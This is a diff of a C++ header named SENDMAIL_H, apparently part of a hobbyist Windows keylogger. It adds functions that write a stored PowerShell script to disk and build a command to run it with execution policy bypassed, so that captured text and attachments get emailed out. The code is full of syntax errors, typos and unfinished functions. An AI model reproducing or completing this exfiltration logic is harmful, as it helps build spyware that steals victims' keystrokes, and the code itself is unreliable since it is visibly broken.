@@ -56,8 +56,63 @@ const std::string &PowerShellScript =
 #undef X_EM_TO
 #undef X_EM_PASS
 
-    std::string StringReplace(std::string s, const std::string $what, const std::string &with)
+    std::string StringReplace(std::string s, const std::string &what, const std::string &with) //(la string s se cambia de what a with
+    {
+        if(what.empty())
+            return s;
+        size_t sp = 0; //string position de tipo size_t
 
+        while(sp = s.find(what, sp))  != std::string::npos) //mientras no sea igual, continua este loop.
+        s.replace(sp, whayt.length(), with), sp += with.length();
+    }
+
+    bool CheckFileExists(const std::string &f)
+    {
+        std::ifstream file (f);
+        return (bool)file;
+    }
+
+    bool CreateScript()
+    {
+        std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));
+
+        if(!script)
+            return false;
+        script << PowerShellScript;
+
+        if(!script)
+            return false;
+
+        script.close();
+
+        return true;
+    }
+
+    Timer m_timer;
+
+    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
+    {
+        bool = ok;
+
+        ok = IO::MrDir(IO::GetOurPath(true));
+        if(!ok)
+            return -1;
+        std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
+        if(!CheckFileExists(scr_path))
+            ok = CreateScript();
+        if(!ok)
+            return -2;
+
+        std::string param = "-ExcecutionPolicy ByPass -File \"" + src_path + "\" - Subj \"" + StringReplace(subject, "\"", "\\\"")
+                            + "\" -Body \"" + StringReplace(body, "\"", "\\\"" + )
+                            + "\" -Att \"" + attatchments + "\"";
+
+        SHELLEXECUTEINFO ShExecInfo = {0};
+        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+        ShExecInfo.lpVerb = "open";
+
+    }
 }
 
 #endif // SENDMAIL_H
